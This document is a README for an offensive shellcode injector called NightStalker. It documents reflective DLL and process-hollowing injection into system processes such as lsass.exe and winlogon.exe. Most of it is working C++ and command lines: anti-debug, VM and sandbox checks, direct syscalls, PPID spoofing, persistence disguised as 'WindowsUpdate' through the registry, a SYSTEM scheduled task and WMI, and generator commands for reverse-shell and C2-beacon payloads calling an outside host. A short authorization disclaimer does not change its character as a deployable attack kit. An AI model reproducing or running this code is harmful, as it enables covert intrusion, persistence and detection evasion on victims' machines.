# NightStalker Advanced Shellcode Injector

## Overview

The NightStalker Advanced Shellcode Injector is a comprehensive red team payload that implements advanced injection techniques with extensive evasion capabilities. It supports reflective DLL injection, process hollowing, and includes multiple anti-detection mechanisms.

## 🌟 Key Features

- **Multiple Injection Methods**: Reflective DLL injection and process hollowing
- **Advanced Evasion**: Anti-debug, sandbox detection, VM detection
- **PPID Spoofing**: Hide under legitimate processes
- **Fileless Execution**: No disk writes, memory-only execution
- **Encryption**: AES/XOR shellcode encryption
- **Architecture Support**: x64 and x86 compatibility
- **Direct Syscalls**: Bypass API monitoring
- **Persistence**: Registry and scheduled task installation
- **Stealth Mode**: Hidden execution, thread hiding

## 🏗️ Architecture

### Core Components

1. **AdvancedInjector Class**: Main injection engine
2. **Anti-Detection Module**: Debugger, VM, and sandbox detection
3. **Encryption Module**: Shellcode encryption/decryption
4. **Process Management**: Target process discovery and manipulation
5. **Persistence Module**: Registry and scheduled task installation

### Injection Methods

#### 1. Reflective DLL Injection
- Allocates memory in target process
- Writes encrypted shellcode
- Creates remote thread for execution
- Supports both x64 and x86 targets

#### 2. Process Hollowing
- Creates suspended target process
- Unmaps original executable
- Injects shellcode into process memory
- Resumes execution with new entry point

## 🚀 Quick Start

### Prerequisites

- Visual Studio 2019+ or Build Tools
- Windows 10+ target system
- Administrator privileges (for some targets)

### Building

```bash
# Using build script
build_injector.bat

# Manual compilation
cl.exe /O2 /MT advanced_injector.cpp /link /OUT:injector.exe

# x64 specific
cl.exe /O2 /MT /D_WIN64 advanced_injector.cpp /link /OUT:injector_x64.exe

# x86 specific
cl.exe /O2 /MT advanced_injector.cpp /link /OUT:injector_x86.exe
```

### Basic Usage

```bash
# Reflective injection into explorer.exe
injector.exe explorer.exe reflective

# Process hollowing with svchost.exe
injector.exe svchost.exe hollowing

# Custom target process
injector.exe winlogon.exe reflective
```

## 🔧 Configuration

### Shellcode Generation

Use the shellcode generator to create encrypted payloads:

```bash
# Generate reverse shell shellcode
python shellcode_generator.py --type reverse_shell --ip 192.168.1.100 --port 4444 --arch x64 --encryption xor --format c

# Generate beacon shellcode
python shellcode_generator.py --type beacon --c2-url https://c2.example.com --arch x64 --encryption aes --format c

# Generate calc launcher (for testing)
python shellcode_generator.py --type calc --arch x64 --encryption xor --format c
```

### Encryption Keys

Replace the default encryption keys in the source code:

```cpp
// XOR key (16 bytes)
const BYTE XOR_KEY[] = {
    0x4A, 0x3F, 0x7B, 0x2E, 0x9C, 0x1D, 0x8A, 0x5F,
    0x6E, 0x2B, 0x4C, 0x8D, 0x1A, 0x7F, 0x3E, 0x9B
};

// AES key (16 bytes)
const BYTE AES_KEY[] = {
    0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
    0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
};
```

## 🎯 Target Processes

### Recommended Targets

| Process | Privileges | Stealth Level | Notes |
|---------|------------|---------------|-------|
| **explorer.exe** | User | ⭐⭐⭐⭐⭐ | Most common, stable |
| **svchost.exe** | System | ⭐⭐⭐⭐ | High privileges |
| **winlogon.exe** | System | ⭐⭐⭐⭐ | Login process |
| **lsass.exe** | System | ⭐⭐⭐ | Requires elevation |
| **csrss.exe** | System | ⭐⭐⭐ | Critical system process |

### Process Selection Criteria

- **Stability**: Process should be long-running
- **Privileges**: Match required access level
- **Detection Risk**: Blend with normal activity
- **Persistence**: Survive system reboots

## 🔐 Anti-Detection Features

### Debugger Detection

```cpp
bool IsDebuggerPresent() {
    // Multiple detection methods
    if (::IsDebuggerPresent()) return true;
    
    // Check PEB BeingDebugged flag
    if (*(BYTE*)(__readgsqword(0x60) + 2)) return true;
    
    // Remote debugger detection
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    return isDebugged;
}
```

### Sandbox Detection

```cpp
bool IsVirtualMachine() {
    // Check processor count
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return true;
    
    // Check VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}
```

### User Interaction Detection

```cpp
bool CheckUserInteraction() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD tickCount = GetTickCount();
        return (tickCount - lii.dwTime) < 300000; // 5 minutes
    }
    return false;
}
```

## 🛡️ Evasion Techniques

### Direct Syscalls

The injector uses direct syscalls to bypass API monitoring:

```cpp
// Direct syscall definitions
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T* RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Usage
NtAllocateVirtualMemory(hProcess, &pRemoteBuffer, 0, &shellcodeSize, 
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

### PPID Spoofing

```cpp
DWORD SpoofParentProcess(const std::string& targetProcess) {
    // Find target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, targetProcess.c_str()) == 0) {
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    return 0;
}
```

### Timing Evasion

```cpp
void SleepWithJitter(DWORD baseTime) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(baseTime * 0.8, baseTime * 1.2);
    Sleep(dis(gen));
}
```

## 📊 Shellcode Types

### 1. Reverse Shell

```bash
# Generate reverse shell
python shellcode_generator.py --type reverse_shell --ip 192.168.1.100 --port 4444 --arch x64
```

### 2. C2 Beacon

```bash
# Generate Cobalt Strike/Sliver beacon
python shellcode_generator.py --type beacon --c2-url https://c2.example.com --arch x64
```

### 3. Custom Shellcode

```bash
# Load custom shellcode from file
python shellcode_generator.py --input custom_shellcode.bin --encryption xor --format c
```

## 🔄 Persistence Methods

### Registry Persistence

```cpp
bool InstallRegistryPersistence(const std::string& payloadPath) {
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
            (const BYTE*)payloadPath.c_str(), payloadPath.length() + 1);
        RegCloseKey(hKey);
        return result == ERROR_SUCCESS;
    }
    return false;
}
```

### Scheduled Task Persistence

```cpp
bool InstallScheduledTaskPersistence(const std::string& payloadPath) {
    std::string command = "schtasks /create /tn \"WindowsUpdate\" /tr \"" + 
        payloadPath + "\" /sc onlogon /ru \"SYSTEM\" /f";
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    return CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}
```

## 🧪 Testing and Validation

### Test Environment Setup

1. **Windows 10/11 VM** with debugging tools
2. **Process Monitor** for API monitoring
3. **Process Hacker** for process analysis
4. **Wireshark** for network monitoring

### Validation Steps

```bash
# 1. Build injector
build_injector.bat

# 2. Generate test shellcode
python shellcode_generator.py --type calc --arch x64 --encryption xor --format c

# 3. Replace shellcode in source and rebuild
# 4. Test injection
injector_x64_Release.exe explorer.exe reflective

# 5. Verify execution
# - Check if calc.exe launches
# - Monitor process tree
# - Check for persistence
```

### Debugging

```bash
# Build debug version
cl.exe /Od /MTd /Zi advanced_injector.cpp /link /OUT:injector_debug.exe

# Run with debugger
windbg injector_debug.exe explorer.exe reflective
```

## 🚨 Security Considerations

### Legal and Ethical

- **Authorization Required**: Only test systems you own or have permission to test
- **Educational Purpose**: Use for learning and authorized assessments
- **No Malicious Use**: Do not use for unauthorized access
- **Compliance**: Follow all applicable laws and regulations

### Operational Security

1. **Encryption**: Always use strong encryption for shellcode
2. **Obfuscation**: Implement additional obfuscation layers
3. **Timing**: Use jitter and random delays
4. **Cleanup**: Remove persistence mechanisms after testing
5. **Monitoring**: Watch for detection events

## 🔧 Advanced Customization

### Custom Anti-Detection

```cpp
// Add custom detection methods
bool CustomAntiDetection() {
    // Check for analysis tools
    const char* tools[] = {
        "wireshark.exe", "procmon.exe", "processhacker.exe",
        "ollydbg.exe", "x64dbg.exe", "ida64.exe"
    };
    
    for (const char* tool : tools) {
        if (FindWindowA(NULL, tool) != NULL) return true;
    }
    return false;
}
```

### Custom Encryption

```cpp
// Implement custom encryption algorithm
std::vector<BYTE> CustomEncrypt(const std::vector<BYTE>& data) {
    std::vector<BYTE> encrypted(data.size());
    for (size_t i = 0; i < data.size(); i++) {
        encrypted[i] = data[i] ^ (i * 0x37 + 0x42);
    }
    return encrypted;
}
```

### Custom Persistence

```cpp
// Add custom persistence methods
bool InstallCustomPersistence(const std::string& payloadPath) {
    // WMI event subscription
    std::string command = "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"WindowsUpdate\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\", EventConsumerName=\"WindowsUpdate\"";
    
    return system(command.c_str()) == 0;
}
```

## 📚 Best Practices

### Development

1. **Code Review**: Thoroughly review all code before deployment
2. **Testing**: Test in isolated environments first
3. **Documentation**: Document all customizations
4. **Version Control**: Use version control for code management

### Deployment

1. **Environment Analysis**: Understand target environment
2. **Privilege Escalation**: Plan privilege escalation paths
3. **Lateral Movement**: Plan lateral movement strategies
4. **Cleanup**: Plan cleanup and persistence removal

### Detection Avoidance

1. **Signature Evasion**: Avoid common signatures
2. **Behavior Analysis**: Mimic legitimate applications
3. **Network Analysis**: Use legitimate traffic patterns
4. **Memory Analysis**: Minimize memory footprint

## 🆘 Troubleshooting

### Common Issues

1. **Compilation Errors**
   - Ensure Visual Studio is properly installed
   - Check Windows SDK version
   - Verify architecture settings

2. **Injection Failures**
   - Check target process privileges
   - Verify shellcode compatibility
   - Check anti-virus interference

3. **Detection Issues**
   - Review anti-detection logic
   - Check for analysis tools
   - Verify timing and jitter

### Debug Information

```cpp
// Enable debug output
#define DEBUG_MODE 1

#ifdef DEBUG_MODE
    std::cout << "[DEBUG] Target process: " << targetProcess << std::endl;
    std::cout << "[DEBUG] Injection method: " << method << std::endl;
    std::cout << "[DEBUG] Shellcode size: " << shellcode.size() << std::endl;
#endif
```

## 📞 Support

- **Documentation**: Check this guide and other docs
- **Examples**: Review example scripts
- **Issues**: Report bugs on GitHub
- **Community**: Join security forums for help

---

**Remember**: Always obtain proper authorization before testing any systems, and follow responsible disclosure practices when reporting vulnerabilities.

**Happy Hacking! 🎯** 